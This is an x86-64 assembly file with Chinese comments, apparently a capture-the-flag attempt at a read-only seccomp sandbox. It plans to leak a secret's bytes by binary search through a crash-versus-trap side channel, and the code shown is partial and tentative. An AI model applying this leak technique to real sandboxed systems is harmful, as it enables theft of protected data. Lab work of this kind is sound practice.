# 这一题只能用read
# 思路是读取后, 将buf指向一块不允许的区域
# 第二次调用read时可能能引发一个异常访问
# 得到异常访问的地址
# 或者用read的返回值是否是-1来判断?
# 可以人为定义出两种退出条件
# 1是read异常地址的退出
# 2是seccomp的退出, 或者int 3
# 通过2分法来计算数据值

.global _start
_start:
.intel_syntax noprefix
        # read(3, *buf, 100)
        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0
        mov rdi, 3
        lea rsi, [rip+0x20]
        mov rdx, 100
        syscall
        # read(3, *buf->[data], 1)
        # addr = 0x1370000
        mov rax, 0
        mov edi, dword ptr [rsi]
        and rdi, 0x000000ff
        cmp rdi, 0x61
        ja  big
        int 3
big:
        lea rsi, [0x1360000]
        mov rdi, 3
        syscall
